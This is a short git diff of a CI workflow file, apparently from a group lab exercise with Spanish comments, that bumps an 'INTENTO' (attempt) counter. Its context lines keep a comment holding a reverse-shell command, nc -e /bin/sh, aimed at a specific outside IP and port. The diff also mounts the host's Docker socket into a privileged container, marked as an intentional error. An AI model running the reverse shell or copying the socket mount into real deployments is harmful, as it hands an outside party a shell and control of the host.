@@ -55,7 +55,7 @@ jobs:
           # Or with nc: nc -e /bin/sh 200.73.69.220 4444
 
 
-          # INTENTO 20
+          # INTENTO 21
           
  
           
@@ -66,6 +66,7 @@ jobs:
           docker build -t app-grupo-${{secrets.GROUP_ID}} .
           docker run -d --privileged \
             -v /dev/fuse:/dev/fuse \
+            -v /var/run/docker.sock:/var/run/docker.sock \ # error intenicionado 21
             --env-file .env \
             --network net4104 \
             --restart unless-stopped \
